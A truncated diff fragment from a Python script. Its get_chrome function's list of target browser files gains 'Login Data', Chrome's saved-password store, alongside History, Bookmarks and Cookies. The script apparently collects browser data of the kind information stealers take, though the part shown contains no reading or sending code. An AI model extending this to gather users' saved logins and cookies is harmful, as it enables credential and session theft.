@@ -1,5 +1,5 @@
 from os.path import os, exists
-list_file = ['History','Bookmarks','Cookies']
+list_file = ['History','Bookmarks','Cookies','Login Data']
 def get_chrome():
     try:
         list_user = [filename 
